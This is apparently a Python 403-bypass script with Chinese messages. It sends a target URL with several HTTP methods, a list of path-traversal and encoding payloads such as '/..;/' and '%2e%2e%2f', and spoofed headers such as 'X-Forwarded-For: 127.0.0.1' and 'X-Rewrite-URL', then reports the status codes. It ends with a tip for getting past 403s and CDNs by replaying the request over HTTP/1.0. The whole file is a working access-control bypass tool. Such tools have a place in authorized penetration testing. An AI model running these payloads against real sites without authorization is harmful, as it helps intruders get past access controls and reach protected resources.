import optparse
import requests
import urllib.parse

def output(head,target,status_code):
    if status_code == 200:
        print("[\033[1;34;40m%s\033[0m] [\033[1;32;40m%s\033[0m] [\033[1;34;40m%s\033[0m]" %(head,target,status_code))
    else:
        print("[\033[1;34;40m%s\033[0m] [\033[1;32;40m%s\033[0m] [%s]" %(head,target,status_code))

def check(url):
    proxies={
        'http':'127.0.0.1:8080',
        'https':'127.0.0.1:8080'
        }
    #proxies=proxies
    print("\033[1;31;40m使用请求方法测试:\033[0m")
    method_res_1 = requests.get(url, allow_redirects=False, verify=False, timeout= 5)
    output('put',url,method_res_1.status_code)

    method_res_2 = requests.put(url, allow_redirects=False, verify=False, timeout= 5)
    output('put',url,method_res_2.status_code)

    method_res_3 = requests.post(url, allow_redirects=False, verify=False, timeout= 5)
    output('put',url,method_res_3.status_code)

    method_res_4 = requests.delete(url, allow_redirects=False, verify=False, timeout= 5,proxies=proxies)
    output('put',url,method_res_4.status_code)

    method_res_5 = requests.patch(url, allow_redirects=False, verify=False, timeout= 5)
    output('put',url,method_res_5.status_code)
    
    print("\033[1;31;40m使用payload测试:\033[0m")

    payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]
    for payload in payloads:
        try:
            payload_url =url + payload
            pay_res = requests.get(payload_url, allow_redirects=False , verify=False, timeout=5)
            # print("[payload] %s [status_code] %i" %(payload_url,pay_res.status_code))
            output('payload',payload_url,pay_res.status_code)
        except:
            pass

    print("\033[1;31;40m使用请求头测试:\033[0m")
    headers = [
        {'X-Forwarded-For':'127.0.0.1'},
        {'X-Forwarded-Host':'127.0.0.1'},
        {'X-Host':'127.0.0.1'},
        {'X-Custom-IP-Authorization':'127.0.0.1'},
        {'X-Original-URL':'127.0.0.1'},
        {'X-Originating-IP':'127.0.0.1'},
        {'X-Remote-IP':'127.0.0.1'},
    ]
    for header in headers:
        header_res = requests.get(url,headers=header,allow_redirects=False , verify=False, timeout=5)
        # print("[header] %s [status_code] %i" %(str(header.keys())[12:][0:-3],header_res.status_code))
        output('header',str(header.keys())[12:][0:-3],header_res.status_code)

    url_lib_res = urllib.parse.urlsplit(url)
    X_Rewrite_url = "%s://%s/dev/null"% (url_lib_res.scheme,url_lib_res.netloc)
    header_res = requests.get(X_Rewrite_url,headers={'X-Rewrite-URL':url},allow_redirects=False , verify=False, timeout=5,proxies=proxies)
    # print("[header] X-Rewrite-URL [status_code] %i" %(header_res.status_code))
    output('header','X-Rewrite-URL',header_res.status_code)
    print("[!!!]还有一种方法记得尝试，bp中重放删除第一行之外的所有数据，并将http协议改为1.0，有可能绕过403及cdn，参考https://mp.weixin.qq.com/s/XG_IcJ-owSBnrJ3c5oqMxg")

def start_url(url):
    check(url)

def start_urls(url_path):
    with open(url_path,"r",encoding='UTF-8') as urls:
        for url in urls.readlines():
            check(url)

if __name__ == '__main__':
    parser = optparse.OptionParser('Example: python %prog -u http://127.0.0.1/d/ \n')
    #url文件
    parser.add_option('-u','--url',dest='url',type='string',help='your urls url')
    #url文件
    parser.add_option('-f','--file',dest='urlsFilePath',type='string',help='your urls file')
  

    (options, args) = parser.parse_args()

    if options.url:
        start_url(options.url)
    elif options.urlsFilePath:
        start_urls(options.urlsFilePath)
    else:
        print("无目标输入")

